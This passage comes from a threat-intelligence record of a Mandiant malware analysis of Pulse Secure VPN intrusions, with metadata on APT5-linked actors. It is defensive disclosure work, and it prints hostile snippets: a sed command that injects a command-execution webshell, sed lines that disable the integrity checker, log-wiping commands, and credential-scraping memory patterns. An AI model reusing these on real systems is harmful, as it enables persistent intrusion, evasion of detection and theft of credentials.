HTML\ntag.\n\nPULSECHECK\n\nThe file secid_canceltoken.cgi (SHA256:\na1dcdf62aafc36dd8cf64774dea80d79fb4e24ba2a82adf4d944d9186acd1cc1) is a webshell\nwritten in Perl that enables arbitrary command execution. With a properly formatted\n\n\n-----\n\nrequest, the script will execute webshell code. Otherwise, the legitimate welcome page of\nthe Pulse Secure VPN software is presumably invoked.\n\nThe script checks for web requests using the HTTP POST method and, if found, will\nfurther check the HTTP request headers for the CGI environment\nvariable HTTP_X_KEY. If this header matches a backdoor key, then the malware will\noutput the result of the command sent in the variable HTTP_X_CMD. This data is RC4\nencrypted and base64-encoded. The passphrase to decrypt is sent in the environment\nvariable HTTP_X_CNT. The webshell will set the content type to Contenttype:text/html and the command output printed. Following this, the script exits.\n\nQUIETPULSE\n\nThe file dsserver (SHA256:\n9f6ac39707822d243445e30d27b8404466aa69c61119d5308785bf4a464a9ebd) is a\nlegitimate Perl script with malicious modifications to fork the child process\n/home/bin/dshelper. The dshelper script does not exist on a clean PulseSecure\ninstallation, this file is described as QUIETPULSE Utility Script.\n\nQUIETPULSE Utility Script\n\nThe file dshelper (SHA256:\nc774eca633136de35c9d2cd339a3b5d29f00f761657ea2aa438de4f33e4bbba4) is a shell\nscript invoked by a malicious version of dsserver that primarily functions as a utility\nscript responsible for copying files and executing commands. Like the ATRIUM patcher,\nthis script accesses /tmp/data, a path which is used during a system upgrade. This file is\ntherefore, like the ATRIUM patcher, used by the attacker to maintain persistence. The\nscript is set to execute in a loop where four main checks are executed every two minutes.\nThe checks are as follows:\n\n_Check 1_\n\nIf /tmp/data/root/home/webserver/htdocs/dana-na/auth/compcheckjava.cgi exists and\nis non-empty then execute:\n\ngrep -c -s 'system($depara)' /tmp/data/root/home/webserver/htdocs/danana/auth/compcheckjava.cgi\n\nIt checks if the file has the contents system($depara). If the file does not contain this\ncontent, then retrieve the first line of the file by executing:\n\nsed -n 1p /tmp/data/root/home/webserver/htdocs/danana/auth/compcheckjava.cgi\n\nThen copy a file via:\n\ncp /home/webserver/htdocs/dana-na/auth/compcheckjava.cgi\n/tmp/data/root/home/webserver/htdocs/dana-na/auth/compcheckjava.cgi\n\n\n-----\n\nThen replace the copy’s first line with the one retrieved from the sed above via:\n\nsed -i 1c\"<varies>\" /tmp/data/root/home/webserver/htdocs/danana/auth/compcheckjava.cgi\n\n_Check 2_\n\nIf /tmp/data/root/home/bin/ exists as a directory, then check if the file\n/tmp/data/root/home/bin/dshelper does not exist. If it does not exist, then place it there\nby copying a file via:\n\ncp -p /home/bin/dshelper /tmp/data/root/home/bin/\n\n_Check 3_\n\nIf /tmp/data/root/home/bin/dsserver exists and is non-empty then execute the following\nto check if the file does not contain the string exec(\"/home/bin/dshelper\"):\n\ngrep -c -s 'exec(\"/home/bin/dshelper\")' /tmp/data/root/home/bin/dsserver\n\nIf it doesn't then execute to insert the line:\n\nsed -i 's/for (;;)/my $monpid = fork();\\nif ($monpid == 0)\n{\\nexec(\\\"\\/home\\/bin\\/dshelper\\\");\\n}\\n&/g'\n/tmp/data/root/home/bin/dsserver\n\n_Check 4_\n\nIf the file /tmp/data/root/home/bin/check_integrity.sh exists and is non-empty, then\ncheck if the file contains the string exit 1 by executing:\n\ngrep -c -s 'exit 1' /tmp/data/root/home/bin/check_integrity.sh\n\nIf the file does contain this content, then execute the following to switch the content to\nexit 0:\n\nsed -i 's/exit 1/exit 0/g' /tmp/data/root/home/bin/check_integrity.sh\n\nPULSEJUMP\n\nThe file with SHA256:\n7fa71a7f76ef63465cfeacf58217e0b66fc71bc81d37c44380a6f572b8a3ec7a is a system\ninformation and credential harvesting Perl script. The sample writes information from\nmultiple sources to the file /tmp/dsactiveuser.statementcounters in append mode.\n\nThe sample begins by retrieving all auth servers via the\nAPI AuthAdmin::getAllAuthServers. and logs the results. Next, the sample logs all roles\nvia the API DSRole::GeneralAdmin::getRoles and writes the values to the file. The sample\nmay also retrieve and log additional information depending on the device configuration.\n\n\n-----\n\nHARDPULSE\n\nThe file compcheckjava.cgi (SHA256:\n1d3ab04e21cfd40aa8d4300a359a09e3b520d39b1496be1e4bc91ae1f6730ecc) has the\nability to read and write arbitrary files and may execute arbitrary commands depending\non the implementation of a particular library function.\n\nThe sample responds to HTTP GETs and PUTs. The GET path is not relevant, but the\nPUT path first checks if the incoming requests checkcode POST param is equal to a\nhardcoded passcode. If this check passes the sample inspects the param hashid to\ndetermine if it's non-empty. If non-empty the sample displays a prompt to the user that\nincludes hardware information and then base64 decodes the param hashid and checks it\nagainst pulsesecure. If this matches a recoveryToken is generated which is the MD5 hash\nof 16 random bytes, with the result hash truncated to 8 characters. This token is then\ndisplayed to the user via the URL https://ive-host/dana-na/auth/recover[.]cgi?token=\n<varies> and the sample exits. If this check did not match then the sample passes the\nbase64 decoded data to a routine DSSafe::psystem which may execute shell commands,\nhowever this implementation is not provided and is speculation.\n\nIf the param hashid is empty the sample instead checks that the param m is non-empty. If\nso, it's matched against get and put which will read/write arbitrary files to the host,\nrespectively.\n\nATRIUM\n\nThe file compcheckresult.cgi (SHA256:\nf2b1bd703c3eb05541ff84ec375573cbdc70309ccb82aac04b72db205d718e90) is a\nwebshell capable of arbitrary command execution. The sample has malicious logic\ninserted at the end of legitimate logic. The malicious logic inspects all requests of any type\nlooking for the HTTP query parameter id. If this query parameter exists, the sample\nexecutes it verbatim on using the system API. The sample does not encode or obfuscate\nthe command in any way. If the query parameter is not found in the request, then the\noriginal legitimate logic is invoked.\n\nPersistence Patcher\n\nThe file DSUpgrade.pm (SHA256:\n224b7c45cf6fe4547d3ea66a12c30f3cb4c601b0a80744154697094e73dbd450) is a patcher\nutility script responsible for persisting webshells across a system upgrade. We’ve\nobserved variants of this utility targeting the persistence of multiple webshell families,\nnotably ATRIUM, STEADYPULSE, and PULSECHECK. Like previous patchers, this\nsample uses sed to insert malicious logic. The attacker likely chose DSUpgade.pm to host\ntheir patch logic as it is a core file in the system upgrade procedure, ensuring the patch is\nduring updates. The patcher modifies content in /tmp/data as this directory holds the\nextracted upgrade image the newly upgraded system will boot into. This results in a\npersistence mechanism which allows the attacker to maintain access to the system across\nupdates.\n\n\n-----\n\nmy $cmd_x=\"sed -i '/echo_console \\\"Saving package\\\"/i(\nsed -i \\\\\\'/main();\\\\\\$/cif(CGI::param(\\\\\\\\\\\"id\\\\\\\\\\\")){\nprint \\\\\\\\\\\"Cache-Control: no-cache\\\\\\\\\\\\\\\\n\\\\\\\\\\\";\nprint \\\\\\\\\\\"Content-type: text/html\\\\\\\\\\\\\\\\n\\\\\\\\\\\\\\\\n\\\\\\\\\\\";\nmy \\\\\\\\\\$na=CGI::param(\\\\\\\\\\\"id\\\\\\\\\\\");\nsystem(\\\\\\\\\\\"\\\\\\\\\\$na\\\\\\\");\n} else{\n&main();\n}\\\\\\' /tmp/data/root$cgi_p;\ncp -f /home/perl/DSUpgrade.pm /tmp/data/root/home/perl;\ncp -f /pkg/dspkginstall /tmp/data/root/pkg/;\n)'/pkg/do-install\";\n\nThe patcher also performs additional shell commands for unpacking a compressed\npackage:\n\nsystem(\"/bin/mount -o remount,rw /dev/root /\");\nsystem(\"/bin/tar\", \"-xzf\", \"/tmp/new-pack.tgz\", \"-C\", \"/tmp\",\"./installer\");\nsystem(\"cp -f /tmp/installer/do-install /pkg/\");\nsystem(\"cp -f /tmp/installer/VERSION /pkg/\");\nsystem(\"cp -f /tmp/installer/sysboot-shlib /pkg/\");\nsystem(\"cp -f /tmp/installer/losetup /pkg/\");\n\nPACEMAKER\n\nThe file memread (SHA256:\n68743e17f393d1f85ee937dffacc91e081b5f6f43477111ac96aa9d44826e4d2) is a credential\nstealer. The sample has the usage information:\n\nUsage: memread [-t time(minute)] [-m size(MB)] [-s sleep_interval(second)]\n\nThe sample starts by setting an alarm that kills the application after a configurable\nnumber of minutes, 14 by default. It then enters a loop which reads /proc/ entries every 2\nseconds looking for a target application, this interval is also configurable. The target is\nfound by opening /proc/<process_name>/cmdline for each entry in the folder and then\nreading this file looking for the string dswsd within the command line. Once found the\ntarget application's proc/<target_pid>/mem is opened, the process is attached to with\nPTRACE, then memory read in chunks up to 512 bytes in size. For each chunk, the string\n20 30 20 0A 00 ( 0 \\n) is searched for as a needle. If found the sample splits the data by\nfirst space, then a dash -. Two dashes are expected to be found, and these are immediately\nconverted into hex numbers, example form: -<number>. If the second number minus the\nfirst is > 8191 the sample reads the data starting at the file offset of the first number, up to\na size specified by second number minus first number.\n\nOnce the sample has read the process memory and found all memory data of interest the\nsample detaches PTRACE then the sample begins memory scanning the copied data. The\nsample tries to locate a sequence of 'flags' in memory one by one to locate what seem to be\n\n\n-----\n\ninformation the attacker wishes to steal. This information is not known, nor is the\nstructure of it. The sequences scanned for generally have start and end scan sequences\nwhich in order scanned for, are:\n\nUSER_START_FLAG: 3C 05 08 75 73 65 72 4E 61 6D 65 05 01 3E 05 00\nUSER_END_FLAG: 3C 2F 05 08 75 73 65 72 4E 61 6D 65 05 01 3E 00\nPASSWORD_START_FLAG: 3C 05 08 70 61 73 73 77 6F 72 64 05 01 3E 00\nPASSWORD_END_FLAG: 3C 2F 05 08 70 61 73 73 77 6F 72 64 05 01 3E 00\nAUTHNUM_START_FLAG: 3C 05 0A 61 75 74 68 4E 75 6D 62 65 72 05 01 3E 00\nAUTHNUM_END_FLAG: 3C 2F 05 0A 61 75 74 68 4E 75 6D 62 65 72 05 01 3E 00\n\nIf all these sequences are found, the data between the start and end is extracted and\neventually formatted and written to the file /tmp/dsserver-check.statementcounters. The\napproximate format of this data is:\n\nName:<username> || Pwd:<password> || AuthNum:<authnumber>\\n\n\nThe sample replaces the following URL encoded values with their ascii representation for\nthe password:\n\n&amp; -> &\n&lt; -> <\n&gt; -> >\n\nPACEMAKER Launcher Utility\n\nAs part of our investigation into PACEMAKER we were able to retrieve a simple bash\nscript responsible for launching the credential stealer. The launcher script hash SHA256\n4c5555955b2e6dc55f52b0c1a3326f3d07b325b112060329c503b294208960ec launches\nPACEMAKER from a hardcoded path with options specifying a 16MB memory read size\nand a memory scan interval of 2 seconds, with a variable self-kill time.\n\n#!/bin/bash\n\n/home/bin/memread -t $1 -m 16 -s 2 &\n\nTHINBLOOD Log Wiper Utility\n\nThe file dsclslog with SHA256\n88170125598a4fb801102ad56494a773895059ac8550a983fdd2ef429653f079 is a log\nwiper utility. The sample provides the usage information:\n\nUsage: dsclslog -f [events|access] -r [Regex1,Regex2,Regex3,...]\n\nThe –f flag specifies if the file log.events.vc0 or log.access.vc0 within the directory\n/home/runtime/logs should be modified. To perform its log cleaning operations the\nsample first makes two copies of whichever log file was chosen, but uses .vc1 and .vc2 as\nthe extension for the new files. The file with the .vc1 is used to search for entries that\nmatch the given entries, and the file with the .vc2 extension is used as a temporary file\n\n\n-----\n\nwhere the cleaned log is written. After generating both files and log cleaning is finished\nthe sample executes the following commands via the system API to overwrite the original\nlog with the cleaned version, then removes the intermediate:\n\nmv /home/runtime/logs/log.<logtype>.vc2\n/home/runtime/logs/log.<logtype>.vc0\nrm /home/runtime/logs/log.<logtype>.vc1\n\nTHINBLOOD LogWiper Utility Variant\n\nThe file clear_log.sh (SHA256:\n1741dc0a491fcc8d078220ac9628152668d3370b92a8eae258e34ba28c6473b9) is a BASH\nscript responsible for zeroing log lines that match a given regex pattern. The sample is\nsimilar to the compiled THINBLOOD Log Wiper but edits logs in-place with sed rather\nthan making temporary copies. The sed commands used are:\n\nsed -i \"s/.\\x00[^\\x00]*<regex_string>[^\\x00]*\\x09.\\x00//g\"\n/data/runtime/logs/<logfile>\n\nsed -i \"s/\\x<hex_char>\\x00[^\\x00]*$2[^\\x00]*\\x09\\x<hex_char>\\x00//g\"\n/data/runtime/logs/<logfile>\n\nThe sample embeds the usage information:\n\nusage: /home/bin/bash clear_log.sh [logfile] [keyword(regex)]\n\nLOCKPICK\n\nThe file libcrypto.so (SHA256:\n2610d0372e0e107053bc001d278ef71f08562e5610691f18b978123c499a74d8) is a shared\nobject containing cryptographic logic from openssl. The sample contains a modification to\nthe routine bnrand_range that breaks the security of the random numbers generated.\nThere are three paths in this routine for generating a random big number between a given\nrange. The first case is unmodified and generates a zeroed big number, the other two\ncases are patched so that a constant value overwrites the generated random value and\nalways returns success. This breaks the random number generation by replacing it with a\nvalue the attacker knows in all cases.\n\nLOCKPICK Patcher\n\nThe file with the hash\nb990f79ce80c24625c97810cb8f161eafdcb10f1b8d9d538df4ca9be387c35e4 is a patcher\nutility responsible for inserting the malicious logic known as LOCKPICK. The patcher\nstarts by running sed on the integrity checker script built into the appliance to insert an\nearly exit routine. This is inserted by the command sed -i '12aexit 0'\n/home/bin/check_integrity.sh which when applied causes this script to exit without\nperforming its intended checks. After this the sample uses python file read/write APIs to\n\n\n-----\n\ninsert long strings of assembly that represent the logic known as LOCKPICK. This file is\ndifferent from the other patchers we’ve identified in that it is python and specifically\ntargets system integrity routines.\n\n**Acknowledgements**\n\nMandiant would like to thank the Stroz Friedberg DFIR and Security Testing teams for\ntheir collaboration with the analysis and research. The team would also like to thank\nJoshua Villanueva, Regina Elwell, Jonathan Lepore, Dimiter Andonov, Josh Triplett,\nJacob Thompson and Michael Dockry for their hard work in analysis and blog content.\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "5d2b9e7f-cf43-4b54-ba18-065aa3003611",
            "created_at": "2022-10-25T16:06:24.199525Z",
            "updated_at": "2022-10-25T16:06:24.199525Z",
            "deleted_at": null,
            "name": "CyberMonitor",
            "url": "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections",
            "description": "APT & Cybercriminals Campaign Collection",
            "reports": null
        }
    ],
    "references": [
        "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections/raw/master/2021/2021.04.20.APT_Pulse_Secure_Zero-Day/Check%20Your%20Pulse_%20Suspected%20APT%20Actors%20Leverage%20Authentication%20Bypass%20Techniques%20and%20Pulse%20Secure%20Zero-Day%20_%20FireEye%20Inc.pdf"
    ],
    "report_names": [
        "Check Your Pulse_ Suspected APT Actors Leverage Authentication Bypass Techniques and Pulse Secure Zero-Day _ FireEye Inc"
    ],
    "threat_actors": [
        {
            "id": "e44de7cd-80f0-4f0e-a348-33da1947fd25",
            "created_at": "2023-12-08T02:00:05.724516Z",
            "updated_at": "2025-03-27T02:00:03.261772Z",
            "deleted_at": null,
            "main_name": "UNC2717",
            "aliases": [],
            "source_name": "MISPGALAXY:UNC2717",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "7e75ee53-c4d3-4260-8106-ed7b61d35f02",
            "created_at": "2023-12-08T02:00:05.765868Z",
            "updated_at": "2025-03-27T02:00:03.269367Z",
            "deleted_at": null,
            "main_name": "UNC2630",
            "aliases": [],
            "source_name": "MISPGALAXY:UNC2630",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "13bedce4-3115-4563-afd5-068e3930e68e",
            "created_at": "2023-01-06T13:46:38.623775Z",
            "updated_at": "2025-03-27T02:00:02.8761Z",
            "deleted_at": null,
            "main_name": "APT5",
            "aliases": [
                "KEYHOLE PANDA",
                "BRONZE FLEETWOOD",
                "TEMP.Bottle",
                "Mulberry Typhoon",
                "Poisoned Flight"
            ],
            "source_name": "MISPGALAXY:APT5",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "e0ffe8ec-caee-414f-8fd5-b69ffd262e6f",
            "created_at": "2024-05-01T02:03:07.950544Z",
            "updated_at": "2025-03-27T02:05:17.265795Z",
            "deleted_at": null,
            "main_name": "BRONZE FLEETWOOD",
            "aliases": [
                "DPD ",
                "Keyhole Panda ",
                "Mulberry Typhoon ",
                "Poisoned Flight ",
                "TG-2754 ",
                "APT5 "
            ],
            "source_name": "Secureworks:BRONZE FLEETWOOD",
            "tools": [
                " Comfoo",
                " Gh0st RAT",
                " Isastart",
                " Leouncia",
                " OrcaRAT",
                " PCShare",
                " Skeleton Key",
                " SlyPidgin",
                " VinSelf",
                "Binanen"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "6d69ef1b-b6f3-47e1-be5a-87ac0fd5ff55",
            "created_at": "2024-04-24T02:00:49.599348Z",
            "updated_at": "2025-03-27T02:00:55.521185Z",
            "deleted_at": null,
            "main_name": "APT5",
            "aliases": [
                "APT5",
                "Mulberry Typhoon",
                "BRONZE FLEETWOOD",
                "Keyhole Panda",
                "UNC2630"
            ],
            "source_name": "MITRE:APT5",
            "tools": [
                "Tasklist",
                "PoisonIvy",
                "RAPIDPULSE",
                "PcShare",
                "Mimikatz",
                "SLOWPULSE",
                "SLIGHTPULSE",
                "Skeleton Key",
                "gh0st RAT",
                "PULSECHECK",
                "netstat"
            ],
            "source_id": "MITRE",
            "reports": null
        }
    ],
    "ts_created_at": 1666716497,
    "ts_updated_at": 1743041725,
    "ts_creation_date": 1618969027,
    "ts_modification_date": 1618969027,
    "files": {
        "pdf": "https://archive.orkl.eu/2df18ace43029121d0bc039c517739e3a76e0d1b.pdf",
        "text": "https://archive.orkl.eu/2df18ace43029121d0bc039c517739e3a76e0d1b.txt",
        "img": "https://archive.orkl.eu/2df18ace43029121d0bc039c517739e3a76e0d1b.jpg"
    }
}